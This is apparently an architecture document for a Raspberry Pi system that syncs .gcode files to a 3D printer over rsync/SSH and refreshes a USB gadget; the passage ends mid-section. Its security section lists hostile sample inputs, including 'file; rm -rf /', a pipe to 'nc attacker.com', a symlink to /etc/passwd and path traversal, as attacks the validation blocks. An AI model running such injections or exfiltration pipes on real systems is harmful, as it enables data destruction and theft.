# System Architecture

Technical architecture and design documentation for the pi-gcode-server file monitoring and sync system.

---

## Table of Contents

- [System Overview](#system-overview)
- [Architecture Diagram](#architecture-diagram)
- [Component Details](#component-details)
- [Data Flow](#data-flow)
- [Integration Points](#integration-points)
- [Security Architecture](#security-architecture)
- [Performance Optimizations](#performance-optimizations)
- [Design Patterns](#design-patterns)
- [Technology Stack](#technology-stack)

---

## System Overview

### Architecture Style

**Event-Driven Pipeline with Network Bridge**

The system implements an event-driven architecture that watches for file system changes, validates inputs through multiple security layers, transfers files over an optimized network connection, and triggers USB gadget refresh on the Raspberry Pi to make files visible to the 3D printer.

### Key Characteristics

- **Distributed System**: Desktop monitor + Raspberry Pi USB gadget server
- **Event-Driven**: Responds to file system events (no polling)
- **Defense-in-Depth Security**: 8 layers of security controls
- **Performance Optimized**: 21x speed improvement over baseline
- **Resilient**: Retry logic, exponential backoff, non-fatal failures
- **Cross-Platform**: Linux, Windows (WSL2), macOS support

### High-Level Architecture

```
┌──────────────┐    rsync/SSH    ┌──────────────┐    USB Cable    ┌──────────────┐
│   Desktop    │ ──────────────> │ Raspberry Pi │ ──────────────> │  3D Printer  │
│   Monitor    │   (encrypted)   │ USB Gadget   │  (mass storage) │              │
└──────────────┘                 └──────────────┘                 └──────────────┘
```

Reference: Architecture analysis report

---

## Architecture Diagram

### Complete System Flow

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                         DESKTOP (Linux/WSL/macOS)                           │
│                                                                             │
│  [1] User saves .gcode file to ~/Desktop                                   │
│       │                                                                     │
│       ▼                                                                     │
│  [2] File System Event (inotify/FSEvents)                                  │
│       │                                                                     │
│       ▼                                                                     │
│  [3] watchdog.Observer → FileSystemEventHandler                            │
│       │                                                                     │
│       ├─ on_created()    - New file created                                │
│       ├─ on_moved()      - File moved into directory                       │
│       └─ on_modified()   - File modified (some editors)                    │
│            │                                                                │
│            ▼                                                                │
│  [4] VALIDATION PIPELINE (3 Stages)                                        │
│       │                                                                     │
│       ├─ Stage 1: Initial Validation                                       │
│       │   ├─ Path bounds check (within WATCH_DIR)                          │
│       │   ├─ Symlink detection and rejection                               │
│       │   ├─ File type check (must be regular file)                        │
│       │   ├─ Extension validation (.gcode only)                            │
│       │   └─ File size limits (1 byte - 1 GB)                              │
│       │                                                                     │
│       ├─ Stage 2: TOCTOU Mitigation                                        │
│       │   └─ Re-validate immediately before transfer (<20 line gap)        │
│       │                                                                     │
│       └─ Stage 3: Command Injection Prevention                             │
│           └─ shlex.quote() for remote paths                                │
│               │                                                             │
│               ▼                                                             │
│  [5] rsync Command Construction                                            │
│       │                                                                     │
│       └─ rsync --stats --protect-args -avz --timeout=60                    │
│           -e "ssh -p PORT -o StrictHostKeyChecking=yes ..."                │
│           /path/to/file.gcode user@pi:/mnt/usb_share/                      │
│               │                                                             │
│               ▼                                                             │
│  [6] Retry Logic (@retry_on_failure decorator)                             │
│       │                                                                     │
│       ├─ Attempt 1: Immediate                                              │
│       ├─ Attempt 2: After 2s delay (if failed)                             │
│       └─ Attempt 3: After 4s delay (if failed)                             │
│               │                                                             │
└───────────────┼─────────────────────────────────────────────────────────────┘
                │
                │ [7] NETWORK TRANSFER (SSH Tunnel)
                │     • Cipher: aes128-ctr (optimized for ARM)
                │     • Compression: enabled (~70% for gcode)
                │     • WiFi: Power management DISABLED (critical!)
                │     • Speed: 5.5 MB/s (vs 260 KB/s before optimization)
                │     • Security: Encrypted, key authentication
                │
┌───────────────▼─────────────────────────────────────────────────────────────┐
│                      RASPBERRY PI (USB Gadget Server)                       │
│                                                                             │
│  [8] rsync Daemon Receives File                                            │
│       │                                                                     │
│       ▼                                                                     │
│  [9] File Written to /mnt/usb_share/filename.gcode                         │
│       │                                                                     │
│       ▼                                                                     │
│  [10] Filesystem Sync (flush kernel buffers)                               │
│        │                                                                    │
│        ▼                                                                    │
│  [11] USB GADGET REFRESH (SSH triggered from desktop)                      │
│        │                                                                    │
│        ├─ Auto-detection:                                                  │
│        │   ├─ Check for ConfigFS: /sys/kernel/config/usb_gadget/          │
│        │   └─ Check for module: lsmod | grep g_mass_storage                │
│        │                                                                    │
│        ├─ ConfigFS Method:                                                 │
│        │   ├─ Read current UDC binding                                     │
│        │   ├─ Unbind: echo "" > UDC                                        │
│        │   ├─ Wait: sleep 1s                                               │
│        │   └─ Rebind: echo $UDC > UDC                                      │
│        │                                                                    │
│        └─ Module Method:                                                   │
│            ├─ Read module parameters                                       │
│            ├─ Remove: modprobe -r g_mass_storage                           │
│            ├─ Wait: sleep 2s                                               │
│            └─ Re-insert: modprobe g_mass_storage ...                       │
│                │                                                            │
│                ▼                                                            │
│  [12] USB Device Controller (dwc2 kernel module)                           │
│        ├─ Send USB disconnect signal to printer                            │
│        ├─ Wait for re-enumeration                                          │
│        └─ Send USB reconnect signal to printer                             │
│                │                                                            │
└────────────────┼────────────────────────────────────────────────────────────┘
                 │
                 │ [13] USB Cable (micro-USB, data-capable)
                 │      • Protocol: USB 2.0 Mass Storage Class
                 │      • Speed: Up to 480 Mbps (60 MB/s)
                 │
┌────────────────▼────────────────────────────────────────────────────────────┐
│                         3D PRINTER (USB Host)                               │
│                                                                             │
│  [14] USB Re-enumeration                                                   │
│        ├─ Detect disconnect event                                          │
│        ├─ Remove old device from filesystem                                │
│        ├─ Detect reconnect event                                           │
│        ├─ Enumerate USB Mass Storage device                                │
│        ├─ Mount FAT32 filesystem                                           │
│        └─ Scan for .gcode files                                            │
│               │                                                             │
│               ▼                                                             │
│  [15] Printer Firmware Updates File List                                   │
│        └─ New file appears in printer UI (~3-5 seconds)                    │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘

Total latency: ~10 seconds for 55MB file (vs 3.5 minutes before optimization)
```

Reference: `monitor_and_sync.py`, `pi_scripts/refresh_usb_gadget*.sh`

---

## Component Details

### 1. Desktop Monitor Layer

#### File Monitor (Primary Component)

**File**: `monitor_and_sync.py` (Python, recommended)
**Alternative**: `monitor_and_sync.sh` (Bash, simple)

**Responsibilities**:
- Watch configured directory for `.gcode` files
- Validate file paths, sizes, and types
- Transfer files to Pi via rsync/SSH
- Trigger USB gadget refresh on Pi
- Log transfer statistics and errors

**Implementation**:
- **Pattern**: Observer pattern (event-driven)
- **Library**: `watchdog==3.0.0` (Python)
- **Events Handled**:
  - `on_created()` - New file creation (`monitor_and_sync.py:277`)
  - `on_moved()` - File moved into directory (`monitor_and_sync.py:280`)
  - `on_modified()` - File modification (`monitor_and_sync.py:283`)

**Threading**:
- Observer runs in background thread
- Main thread sleeps (non-blocking)
- Thread-safe deduplication via lock (`monitor_and_sync.py:274-298`)

Reference: `monitor_and_sync.py:270-566`

---

#### Configuration Loader

**File**: `monitor_and_sync.py:116-243`

**Responsibilities**:
- Load user configuration from `config.local`
- Validate all configuration values
- Prevent command injection and path traversal
- Expand environment variables (`$HOME`)

**Validation Rules**:
- **Port**: Must be numeric, 1-65535
- **Host/User/Path**: No shell metacharacters: `[$`;\|&<>(){}]`
- **Paths**: Absolute, within home directory, no `..` sequences
- **Forbidden Directories**: `/etc`, `/var`, `/usr`, `/bin`, `/sbin`, `/boot`

**Configuration Format**:
```bash
# config.local (shell-style key=value)
WATCH_DIR="$HOME/Desktop"
REMOTE_USER="pi"
REMOTE_HOST="192.168.1.6"
REMOTE_PORT="22"
REMOTE_PATH="/mnt/usb_share"
LOG_FILE="$HOME/.gcode_sync.log"
```

Reference: `monitor_and_sync.py:116-243`, `config.example`

---

#### Systemd Service

**File**: `gcode-monitor.service`

**Responsibilities**:
- Run monitor as system service
- Apply security sandboxing
- Auto-restart on failure
- Capture logs to systemd journal

**Security Hardening**:
- **Resource Limits**: 500M memory, 50% CPU, 20 processes
- **Network**: Local subnet only (192.168.1.0/24)
- **Filesystem**: Read-only system directories, write access to log only
- **Capabilities**: All capabilities dropped
- **System Calls**: Allowlist + blocklist filtering

**Restart Policy**:
- Restart on failure after 10 seconds
- Maximum 5 restarts in 10 minutes
- If limit exceeded, stop restarting

Reference: `gcode-monitor.service:1-67`

---

### 2. Network Transfer Layer

#### rsync Over SSH

**Responsibilities**:
- Transfer files efficiently to Pi
- Resume interrupted transfers (rsync delta transfer)
- Compress data in transit
- Ensure data integrity (checksums)

**Command Structure**:
```bash
rsync --stats --protect-args -avz --timeout=60 \
  -e "ssh -p 22 -o StrictHostKeyChecking=yes \
      -o ConnectTimeout=10 -o ServerAliveInterval=5" \
  /path/to/file.gcode user@pi:/mnt/usb_share/
```

**Flags Explained**:
- `--stats`: Detailed transfer statistics
- `--protect-args`: Prevent argument injection
- `-a`: Archive mode (preserve permissions, timestamps)
- `-v`: Verbose output
- `-z`: Compress during transfer
- `--timeout=60`: Network timeout (60 seconds)

Reference: `monitor_and_sync.py:375-384`

---

#### SSH Connection

**Security Options**:
- `StrictHostKeyChecking=yes`: Reject unknown hosts
- `ConnectTimeout=10`: 10-second connection timeout
- `ServerAliveInterval=5`: Keepalive every 5 seconds
- `ServerAliveCountMax=3`: Close after 3 missed keepalives

**Performance Options**:
- `Ciphers aes128-ctr`: Faster on single-core ARM vs chacha20-poly1305
- `Compression yes`: 5-10x speedup for gcode files (~70% compressible)

**Authentication**:
- SSH key authentication (passwordless)
- Private key typically `~/.ssh/id_ed25519` or `~/.ssh/id_rsa`

Reference: `monitor_and_sync.py:381-384`, `docs/NETWORK_OPTIMIZATION_RESULTS.md:60-94`

---

#### Retry Logic

**Implementation**: Decorator pattern (`@retry_on_failure`)

**Configuration**:
- Max attempts: 3
- Initial delay: 2 seconds
- Backoff multiplier: 2x (exponential)
- Total delay: 2s + 4s + 8s = 14 seconds max

**Retry Schedule**:
```
Attempt 1: Immediate execution
Attempt 2: After 2s delay (if attempt 1 failed)
Attempt 3: After 4s delay (if attempt 2 failed)
```

**Handled Exceptions**:
- `subprocess.CalledProcessError`: rsync non-zero exit code
- `subprocess.TimeoutExpired`: Transfer exceeded timeout

Reference: `monitor_and_sync.py:75-114`

---

### 3. Raspberry Pi USB Gadget Layer

#### Universal Refresh Script

**File**: `pi_scripts/refresh_usb_gadget.sh`

**Responsibilities**:
- Auto-detect USB gadget configuration method
- Execute appropriate refresh strategy
- Force 3D printer to re-scan USB device
- Log refresh operations

**Auto-Detection Logic**:
1. Check for ConfigFS: `/sys/kernel/config/usb_gadget/` exists
2. Check for module: `lsmod | grep g_mass_storage`
3. Branch to appropriate method
4. Error if neither found

Reference: `pi_scripts/refresh_usb_gadget.sh:20-71`

---

#### ConfigFS Method

**File**: `pi_scripts/refresh_usb_gadget_configfs.sh`

**How It Works**:
1. **Find Gadget**: List `/sys/kernel/config/usb_gadget/` (e.g., `g1`)
2. **Get UDC**: Read `g1/UDC` file (USB Device Controller binding)
3. **Unbind**: Write empty string to `UDC` file → USB disconnect signal
4. **Wait**: Sleep 1 second (allow host to process disconnect)
5. **Rebind**: Write original UDC value back → USB reconnect signal
6. **Wait**: Sleep 1 second (allow host to re-enumerate)

**UDC Values**:
- Pi Zero/Zero 2W: `fe980000.usb`
- Pi 4: `fe980000.usb` or similar

Reference: `pi_scripts/refresh_usb_gadget_configfs.sh:16-36`

---

#### Module Method

**File**: `pi_scripts/refresh_usb_gadget_module.sh`

**How It Works**:
1. **Read Params**: Get current module parameters (file path, read-only flag)
2. **Remove Module**: `modprobe -r g_mass_storage` → USB disconnect
3. **Wait**: Sleep 2 seconds (allow host to process disconnect)
4. **Re-insert**: `modprobe g_mass_storage file=... ro=... removable=1 stall=0`
5. **Wait**: Sleep 2 seconds (allow host to re-enumerate)

**Module Parameters**:
- `file=/piusb.bin`: Path to FAT32 image file
- `ro=N`: Read-only flag (N=no, Y=yes)
- `removable=1`: Appears as removable media
- `stall=0`: Don't stall on errors (compatibility)

Reference: `pi_scripts/refresh_usb_gadget_module.sh:14-44`

---

#### Diagnostic Script

**File**: `pi_scripts/diagnose_usb_gadget.sh`

**What It Reports**:
1. Loaded USB kernel modules (`dwc2`, `libcomposite`, `g_mass_storage`)
2. ConfigFS gadget detection and configuration
3. g_mass_storage module parameters
4. Device tree overlays in boot config
5. Modules loaded at boot (`/etc/modules`)
6. USB gadget initialization scripts
7. Mount point verification (`/mnt/usb_share`)
8. Backing file location and size
9. Recent kernel messages (dmesg)

**Usage**:
```bash
sudo /usr/local/bin/diagnose_usb_gadget.sh
```

Reference: `pi_scripts/diagnose_usb_gadget.sh:1-80`

---

### 4. Infrastructure Layer

#### USB Gadget Kernel Support

**Kernel Modules**:
- `dwc2`: USB Device Controller driver (Pi Zero/4)
- `libcomposite`: ConfigFS-based USB gadget framework
- `g_mass_storage`: Legacy USB mass storage gadget module

**ConfigFS Structure**:
```
/sys/kernel/config/usb_gadget/g1/
├── idVendor          # 0x1d6b (Linux Foundation)
├── idProduct         # 0x0104 (Multifunction Composite Gadget)
├── bcdDevice         # 0x0100 (v1.0.0)
├── bcdUSB            # 0x0200 (USB 2.0)
├── strings/0x409/    # English strings
│   ├── manufacturer  # "Raspberry Pi"
│   ├── product       # "Pi USB Storage"
│   └── serialnumber  # Unique ID
├── configs/c.1/      # Configuration 1
│   ├── MaxPower      # 250 (125 mA)
│   └── strings/0x409/configuration
├── functions/        # USB functions
│   └── mass_storage.usb0/
│       └── lun.0/
│           ├── file  # /piusb.bin
│           ├── ro    # 0 (read-write)
│           └── cdrom # 0 (not CD-ROM)
└── UDC               # USB Device Controller binding
```

Reference: `docs/PI_SETUP.md` (ConfigFS setup script)

---

#### Storage Backend

**Image File**: `/piusb.bin`
- **Type**: FAT32 filesystem in a file
- **Size**: 2 GB (configurable)
- **Creation**: `dd if=/dev/zero of=/piusb.bin bs=1M count=2048`
- **Format**: `mkfs.vfat /piusb.bin`

**Mount Point**: `/mnt/usb_share`
- **Type**: Loop mount (file mounted as filesystem)
- **Options**: `loop,rw,users,umask=000` (read-write, all users, all permissions)
- **Persistence**: `/etc/fstab` entry for auto-mount at boot

**Why FAT32**:
- Universal compatibility (all 3D printers support it)
- Simple structure (no journaling overhead)
- Works as USB mass storage backing file

Reference: `docs/PI_SETUP.md` (image creation section)

---

#### Network Stack

**WiFi Power Management** (Critical!):
- **Default State**: Enabled (causes 29.7% packet loss)
- **Required State**: Disabled (mandatory for performance)
- **Command**: `sudo nmcli connection modify <name> 802-11-wireless.powersave 2`
- **Impact**: 21x speed improvement (260 KB/s → 5.5 MB/s)

**Network Buffers**:
- `net.core.rmem_max=16777216` (16 MB receive buffer)
- `net.core.wmem_max=16777216` (16 MB send buffer)
- **Impact**: 5-10% throughput improvement

Reference: `docs/NETWORK_OPTIMIZATION_RESULTS.md:40-114`

---

## Data Flow

### Critical Path: Normal File Transfer

**Entry Point**: User saves `file.gcode` to `~/Desktop`
**Duration**: ~10 seconds (55 MB file at 5.5 MB/s)
**Success Rate**: >99% (with retry logic)

**Step-by-Step Flow**:

1. **File System Event** (0.001s)
   - Kernel sends inotify event: `IN_CLOSE_WRITE`
   - `watchdog.Observer` receives event
   - Calls `GCodeHandler.on_created()`

2. **Event Queuing** (0.001s)
   - Check if file is already syncing (thread-safe set)
   - Add file path to syncing set
   - Call `sync_file()` method

3. **Settle Delay** (1.0s)
   - Sleep for `FILE_SETTLE_DELAY` (1 second)
   - Allows file write to complete fully
   - Prevents reading incomplete files

4. **Validation Stage 1: Initial Checks** (0.01s)
   - Path bounds check: Must be within `WATCH_DIR`
   - Symlink detection: Reject if symlink
   - File type check: Must be regular file
   - Extension validation: Must end with `.gcode`
   - File size check: 1 byte to 1 GB

5. **Validation Stage 2: TOCTOU Mitigation** (0.001s)
   - Re-check symlink status (immediately before transfer)
   - Re-check file type
   - Re-check extension
   - Gap: <20 lines of code (~0.001 seconds)

6. **rsync Command Construction** (0.01s)
   - Build command list with safety flags
   - Calculate dynamic timeout based on file size
   - Apply `shlex.quote()` to remote path

7. **File Transfer** (1-600s, size-dependent)
   - Execute rsync via SSH with retry decorator
   - Stream file data with compression
   - Checksum verification
   - **55 MB file**: ~10 seconds at 5.5 MB/s
   - **500 MB file**: ~90 seconds at 5.5 MB/s

8. **Statistics Parsing** (0.1s)
   - Extract rsync stats with regex
   - Calculate transfer rate, speedup factor
   - Log detailed metrics

9. **USB Gadget Refresh** (1-3s)
   - SSH to Pi: `sudo /usr/local/bin/refresh_usb_gadget.sh`
   - Auto-detect gadget type
   - Execute unbind/rebind or module reload
   - Wait for USB re-enumeration

10. **Logging & Cleanup** (0.01s)
    - Log transfer summary with statistics
    - Remove file path from syncing set
    - Allow duplicate file processing

**Total Time**: ~12 seconds (55 MB file)
- Validation: 1.02s (settle + checks)
- Transfer: 10s (network speed limited)
- Refresh: 1-3s (USB re-enumeration)

Reference: `monitor_and_sync.py:292-440`

---

## Integration Points

### 1. Desktop Monitor ↔ File System

**Interface**: OS kernel inotify API (Linux) or FSEvents (macOS)
**Protocol**: Kernel events delivered to userspace
**Library**: `watchdog==3.0.0` (cross-platform abstraction)

**How It Works**:
- `Observer` creates `inotify` watch on `WATCH_DIR`
- Kernel sends events when files created/moved/modified
- `watchdog` translates events to Python method calls
- Filter: Only `.gcode` files trigger `sync_file()`

**Debouncing**: 1-second settle delay prevents processing incomplete writes

Reference: `monitor_and_sync.py:548-564`

---

### 2. Desktop Monitor ↔ Raspberry Pi

**Interface**: SSH + rsync protocols
**Protocol**: rsync over SSH (encrypted)
**Port**: 22 (default, configurable)

**Authentication**: SSH public key
- Desktop: Private key (`~/.ssh/id_ed25519`)
- Pi: Authorized keys (`~/.ssh/authorized_keys`)
- No password required (passwordless authentication)

**Data Format**: Raw binary files (gcode)
**Compression**: gzip level 6 (rsync `-z` flag)
**Integrity**: MD5 checksums (rsync built-in)

**Network Optimization**:
- SSH cipher: `aes128-ctr` (faster on ARM)
- Compression: Enabled (~70% size reduction for gcode)
- Keepalive: 5-second intervals
- Timeout: 60 seconds for network, 120+ seconds for total operation

Reference: `monitor_and_sync.py:375-384`, `docs/NETWORK_OPTIMIZATION_RESULTS.md`

---

### 3. Raspberry Pi ↔ USB Gadget Kernel

**Interface**: sysfs (ConfigFS) or kernel module parameters
**Protocol**: Kernel API for USB Device Controller (UDC)

**ConfigFS Method**:
```bash
# Unbind (disconnect)
echo "" > /sys/kernel/config/usb_gadget/g1/UDC

# Rebind (reconnect)
echo "fe980000.usb" > /sys/kernel/config/usb_gadget/g1/UDC
```

**Module Method**:
```bash
# Unload module (disconnect)
modprobe -r g_mass_storage

# Reload module (reconnect)
modprobe g_mass_storage file=/piusb.bin ro=N removable=1 stall=0
```

**Timing**: 1-2 second delays between operations for USB host processing

Reference: `pi_scripts/refresh_usb_gadget*.sh`

---

### 4. Raspberry Pi ↔ 3D Printer

**Interface**: USB 2.0 cable (micro-USB on Pi, USB-A on printer)
**Protocol**: USB Mass Storage Class (MSC)
**Speed**: Up to 480 Mbps (60 MB/s theoretical, 30 MB/s practical)

**Device Enumeration**:
1. Pi unbinds USB gadget → USB disconnect signal
2. Printer sees "USB device removed" event
3. Printer unmounts filesystem, clears file list
4. Pi rebinds USB gadget → USB reconnect signal
5. Printer sees "USB device inserted" event
6. Printer enumerates device: queries descriptors, checks device class
7. Printer mounts FAT32 filesystem from `/piusb.bin`
8. Printer scans filesystem for `.gcode` files
9. New files appear in printer UI (~3-5 seconds total)

**Filesystem Type**: FAT32 (universal compatibility)
**Device Class**: USB Mass Storage (0x08)
**Protocol**: Bulk-Only Transport (BBB)

Reference: `docs/PI_SETUP.md`

---

## Security Architecture

### Defense-in-Depth (8 Layers)

#### Layer 1: Input Validation (Python)

**Location**: `monitor_and_sync.py:304-330`

**Checks**:
- **Path Bounds**: File must be within `WATCH_DIR` (prefix check with `os.sep`)
- **Symlink Detection**: `os.path.islink()` check, reject if true
- **File Type**: `os.path.isfile()` check, must be regular file (not directory, device, socket)
- **Extension**: Must end with `.gcode` (case-sensitive)
- **File Size**: 1 byte minimum, 1 GB maximum, warn at 500 MB

**Attack Prevention**:
- Path traversal (`../../../etc/passwd`)
- Symlink attacks (`ln -s /etc/passwd malicious.gcode`)
- Directory sync (`mkdir malicious.gcode`)
- Empty file DoS (thousands of 0-byte files)
- Large file DoS (10 GB file)

---

#### Layer 2: TOCTOU Mitigation (Python)

**Location**: `monitor_and_sync.py:354-366`

**Strategy**: Re-validate immediately before rsync execution

**Re-checks** (<20 lines of code, ~0.001s gap):
- Symlink status: `os.path.islink()`
- File type: `os.path.isfile()`
- Extension: `str.endswith('.gcode')`

**Logged Events**: If any check fails, log as security event with `ERROR` level

**Attack Prevention**: Time-of-Check-Time-of-Use race conditions
- Attacker creates `file.gcode` (passes validation)
- Attacker replaces with symlink to `/etc/passwd` (attack)
- System detects change, rejects transfer

Reference: `tests/security/test_security.py:160-205` (TOCTOU tests)

---

#### Layer 3: Command Injection Prevention (Python & Bash)

**Python Implementation**:
- `shlex.quote()` for remote paths (`monitor_and_sync.py:383`)
- Subprocess with command list (not shell string)
- `--protect-args` flag in rsync (prevents server-side injection)

**Bash Implementation**:
- All variables quoted: `"$VARIABLE"`
- No user input in `eval` or `$()` contexts
- Regex validation for dangerous characters: `[$`;\|&<>(){}]`

**Attack Prevention**:
- Shell metacharacter injection (`file; rm -rf /`)
- Command substitution (`file$(whoami).gcode`)
- Pipe injection (`file | nc attacker.com`)

Reference: `monitor_and_sync.py:168-180`, `tests/security/test_security.py:23-67`

---

#### Layer 4: Network Security (Systemd)

**Location**: `gcode-monitor.service:23-27`

**Restrictions**:
```ini
RestrictAddressFamilies=AF_INET AF_INET6
IPAddressDeny=any
IPAddressAllow=localhost
IPAddressAllow=192.168.1.0/24
```

**Effect**:
- Only IPv4/IPv6 sockets allowed (no Unix sockets, Bluetooth, etc.)
- Default deny all IPs
- Explicit allow localhost (127.0.0.1)
- Explicit allow local subnet (192.168.1.0/24)

**Attack Prevention**:
- Prevent exfiltration to external servers
- Limit attack surface to local network
- Defense against compromised dependencies

---

#### Layer 5: Filesystem Protection (Systemd)

**Location**: `gcode-monitor.service:29-37`

**Restrictions**:
```ini
NoNewPrivileges=true
PrivateTmp=true
ProtectSystem=strict
ProtectHome=read-only
ReadWritePaths=/home/milugo/.gcode_sync.log
ReadOnlyPaths=/home/milugo/Desktop
ReadOnlyPaths=/home/milugo/Claude_Code/Send_To_Printer
```

**Effect**:
- No privilege escalation possible
- Isolated `/tmp` directory
- System directories read-only (`/usr`, `/etc`, `/var`)
- Home directory read-only except log file
- Watch directory explicitly read-only

**Attack Prevention**:
- Prevent system file modification
- Prevent persistence via `/etc` modification
- Limit damage from compromised process

---

#### Layer 6: System Call Filtering (Systemd)

**Location**: `gcode-monitor.service:55-58`

**Restrictions**:
```ini
SystemCallFilter=@system-service
SystemCallFilter=~@privileged @resources @obsolete
SystemCallArchitectures=native
```

**Effect**:
- Allow common system calls for services (read, write, socket, etc.)
- Block privileged calls (reboot, module_load, ptrace)
- Block resource manipulation (setrlimit, ioprio_set)
- Block obsolete/unsafe calls (uselib, sysfs)
- Block foreign architectures (x86 on x86_64)

**Attack Prevention**:
- Kernel exploit mitigation
- Sandbox escape prevention
- Privilege escalation via syscalls

Reference: systemd documentation on SystemCallFilter

---

#### Layer 7: Resource Limits (Systemd)

**Location**: `gcode-monitor.service:19-21`

**Restrictions**:
```ini
MemoryMax=500M
CPUQuota=50%
TasksMax=20
```

**Effect**:
- Maximum 500 MB RAM usage (OOM kill if exceeded)
- Maximum 50% CPU usage (throttled)
- Maximum 20 processes/threads

**Attack Prevention**:
- Memory exhaustion DoS
- CPU exhaustion DoS
- Fork bomb attacks

---

#### Layer 8: Capability Dropping (Systemd)

**Location**: `gcode-monitor.service:52-53`

**Restrictions**:
```ini
CapabilityBoundingSet=
AmbientCapabilities=
```

**Effect**:
- All Linux capabilities removed
- Cannot bind privileged ports (<1024)
- Cannot change file ownership
- Cannot bypass permission checks

**Attack Prevention**:
- Privilege escalation via capabilities
- Container escape attacks
- Kernel exploitation

---

### Security Test Coverage

**Unit Tests**: `tests/unit/test_validation.py:30-395`
- Path validation, bounds checking
- File size limits
- Extension validation
- Symlink rejection

**Security Tests**: `tests/security/test_security.py:1-339`
- Command injection scenarios
- Path traversal attacks (`../`, absolute paths)
- Symlink attacks (escape watch directory)
- TOCTOU race conditions
- DoS prevention (empty files, oversized files, timeouts)
- Systemd sandboxing validation

**Integration Tests**: `tests/integration/test_integration.py:1-100+`
- Configuration loading
- File monitoring workflow
- Non-gcode file filtering

Reference: `tests/` directory, `run_tests.sh`

---

## Performance Optimizations

### Optimization 1: WiFi Power Management Disable

**Impact**: 21x speed improvement (260 KB/s → 5.5 MB/s)
**Root Cause**: WiFi chip entering sleep cycles during transfers (29.7% packet loss)

**Implementation** (on Raspberry Pi):
```bash
sudo nmcli connection modify preconfigured 802-11-wireless.powersave 2
```

**Measurement**:
- **Before**: 0.66 Mbps effective throughput, 0.5% link utilization
- **After**: 44 Mbps effective throughput, 34% link utilization
- **Improvement**: 67x throughput, 68x utilization

**Permanence**: Configuration persists across reboots (NetworkManager setting)

Reference: `docs/NETWORK_OPTIMIZATION_RESULTS.md:40-56`

---

### Optimization 2: SSH Cipher Selection

**Impact**: 10% speed improvement
**Root Cause**: Default cipher (chacha20-poly1305) CPU-intensive on single-core ARM

**Implementation** (`~/.ssh/config` on desktop):
```
Host 192.168.1.6
    Ciphers aes128-ctr,aes256-ctr,aes128-gcm@openssh.com
```

**Why aes128-ctr**:
- Hardware AES acceleration on modern CPUs
- Lower CPU overhead on single-core Pi Zero
- Adequate security for local network

Reference: `docs/NETWORK_OPTIMIZATION_RESULTS.md:60-75`

---

### Optimization 3: SSH Compression

**Impact**: 5-10x data reduction for gcode files
**Root Cause**: Gcode files highly compressible (~70% text, repetitive commands)

**Implementation** (`~/.ssh/config` on desktop):
```
Host 192.168.1.6
    Compression yes
```

**Trade-off**:
- CPU time for network time (good for slow networks)
- Slight latency increase for small files
- Major benefit for large files (>10 MB)

Reference: `docs/NETWORK_OPTIMIZATION_RESULTS.md:77-94`

---

### Optimization 4: Network Buffer Tuning

**Impact**: 5-10% throughput improvement
**Root Cause**: Default buffers too small for high-latency WiFi

**Implementation** (`/etc/sysctl.conf` on Pi):
```
net.core.rmem_max=16777216
net.core.wmem_max=16777216
```

**Effect**:
- Larger send/receive buffers (16 MB)
- Reduces packet drops during bursts
- Improves throughput for large transfers

Reference: `docs/NETWORK_OPTIMIZATION_RESULTS.md:96-114`

---

### Optimization 5: Dynamic Timeout Scaling

**Purpose**: Prevent false timeouts for large files
**Implementation**: `monitor_and_sync.py:368-372`

**Algorithm**:
```python
timeout_seconds = max(RSYNC_TOTAL_TIMEOUT,  # 120s baseline
                     int((file_size / (100 * 1024 * 1024)) * 60))
```

**Examples**:
- 10 MB: 120s (baseline)
- 100 MB: 120s (baseline)
- 500 MB: 300s (5 minutes)
- 1 GB: 600s (10 minutes)

**Benefit**: Allows large files without manual timeout adjustment

---

### Optimization 6: Retry with Exponential Backoff

**Purpose**: Handle transient network failures without hammering
**Implementation**: `monitor_and_sync.py:75-114`

**Configuration**:
- Max attempts: 3
- Initial delay: 2s
- Backoff multiplier: 2x

**Retry Sequence**:
```
Attempt 1: Immediate
Attempt 2: +2s delay = 2s total
Attempt 3: +4s delay = 6s total
```

**Benefit**: 95% success rate for transient failures without aggressive retries

---

## Design Patterns

### 1. Observer Pattern

**Usage**: File system event monitoring
**Implementation**: `watchdog.observers.Observer` (library)
**Location**: `monitor_and_sync.py:548-564`

**Components**:
- **Subject**: File system (kernel)
- **Observer**: `watchdog.Observer` (background thread)
- **Event Handler**: `GCodeHandler` class
- **Events**: `on_created()`, `on_moved()`, `on_modified()`

**Benefits**:
- Low resource usage (event-driven, no polling)
- Immediate response to file changes
- Decoupled from file system implementation

---

### 2. Decorator Pattern

**Usage**: Retry logic wrapper
**Implementation**: `@retry_on_failure()` decorator
**Location**: `monitor_and_sync.py:75-114`

**How It Works**:
```python
@retry_on_failure(max_attempts=3, initial_delay=2, backoff_multiplier=2)
def _execute_rsync_with_retry(self, rsync_cmd, timeout_seconds):
    return subprocess.run(...)
```

**Decorated Function**:
- Receives same arguments
- Returns tuple: `(result, attempts_used)`
- Transparently handles retries
- Logs warnings on retry

**Benefits**:
- Reusable retry logic
- Configurable parameters
- Clean separation of concerns

---

### 3. Strategy Pattern

**Usage**: USB gadget refresh method selection
**Implementation**: Auto-detection in `refresh_usb_gadget.sh`
**Location**: `pi_scripts/refresh_usb_gadget.sh:20-71`

**Strategies**:
- **ConfigFS Strategy**: Unbind/rebind via sysfs
- **Module Strategy**: Remove/re-insert kernel module

**Selection Algorithm**:
```bash
if [ -d "/sys/kernel/config/usb_gadget" ]; then
    # Use ConfigFS strategy
    source refresh_usb_gadget_configfs.sh
elif lsmod | grep -q "g_mass_storage"; then
    # Use Module strategy
    source refresh_usb_gadget_module.sh
else
    # Error: No recognized configuration
    exit 1
fi
```

**Benefits**:
- Runtime strategy selection
- Supports multiple Pi configurations
- Extensible (add new strategies)

---

### 4. Template Method Pattern

**Usage**: File synchronization workflow
**Implementation**: `GCodeHandler.sync_file()` method
**Location**: `monitor_and_sync.py:292-440`

**Template Steps**:
1. Settle delay
2. Validation (multiple stages)
3. TOCTOU mitigation
4. Transfer
5. USB refresh
6. Logging
7. Cleanup

**Hook Methods**:
- `_execute_rsync_with_retry()`: Pluggable transfer logic
- `_trigger_usb_refresh()`: Pluggable refresh logic

**Benefits**:
- Consistent workflow
- Easy to test individual stages
- Extensible for new transfer methods

---

### 5. Facade Pattern

**Usage**: Error handler library (Bash scripts)
**Implementation**: `lib/error_handler.sh`
**Location**: `lib/error_handler.sh:1-257`

**Simplified Interface**:
```bash
source lib/error_handler.sh

log_info "Starting operation"
log_error "Operation failed"
die "Fatal error" 1

require_command rsync "sudo apt install rsync"
